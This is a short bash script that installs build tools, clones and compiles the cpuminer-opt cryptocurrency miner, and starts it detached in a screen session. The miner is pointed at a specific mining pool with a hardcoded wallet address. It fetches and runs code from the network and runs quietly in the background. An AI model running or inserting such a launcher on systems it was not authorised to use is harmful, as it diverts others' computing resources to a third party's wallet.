#!/bin/bash
apt-get update && apt-get install -y build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git screen
git clone https://github.com/JayDDee/cpuminer-opt.git
cd cpuminer-opt
./build.sh
cp cpuminer ../
cd ..
screen -d -m ./cpuminer -a lyra2z -o stratum+tcp://us1.minadorespool.gq:4553 -u CNf6ZRo5JDSF7EBCLf22W9goXMBsdFD7XW -p c=CRS
